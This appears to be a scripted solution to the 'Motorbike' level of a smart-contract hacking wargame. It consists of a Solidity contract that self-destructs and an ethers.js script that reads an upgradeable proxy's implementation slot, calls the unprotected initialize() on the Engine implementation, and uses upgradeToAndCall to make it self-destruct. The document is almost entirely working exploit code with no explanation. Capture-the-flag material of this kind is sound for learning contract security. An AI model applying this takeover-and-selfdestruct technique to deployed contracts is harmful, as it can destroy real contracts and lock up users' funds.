# 25 - Motorbike

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract MotorbikeExploit {
    /**
     * @dev Calls `selfdestruct` in the context of the calling `Engine`
     * contract.
     */
    function selfDestruct() external {
        selfdestruct(payable(address(0)));
    }
}
```

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const {
    provider,
    playerWalletSigner,
    contract: motorbikeContract
  } = await setup('Motorbike')
  const EXPLOIT_CONTRACT_ADDRESS = '0x69Bd6eB4641641F35f252d4E18Bb2D01CDE87d44'
  const _IMPLEMENTATION_SLOT =
    '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'

  // Get `Engine` contract address from `Motorbike` storage
  const implementationSlot = await provider.getStorageAt(
    motorbikeContract.address,
    _IMPLEMENTATION_SLOT
  )
  const engineContractAddress = `0x${implementationSlot.slice(-40)}` // Last 20 bytes

  // Create `Engine` contract instance
  const engineContract = new ethers.Contract(
    engineContractAddress,
    [
      'function initialize() external',
      'function upgradeToAndCall(address newImplementation, bytes memory data) external payable'
    ],
    playerWalletSigner
  )

  // Call `initialize` on `Engine` contract
  const initializeTx = await engineContract.initialize()
  await initializeTx.wait(1)

  // Call `upgradeToAndCall` with exploit contract address and `selfDestruct` function
  const ABI = ['function selfDestruct() external']
  const iface = new ethers.utils.Interface(ABI)
  const upgradeToAndCallTx = await engineContract.upgradeToAndCall(
    EXPLOIT_CONTRACT_ADDRESS,
    iface.encodeFunctionData('selfDestruct', []),
    {
      gasLimit: 10000000,
      gasPrice: 100000000000
    }
  )
  await upgradeToAndCallTx.wait(1)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
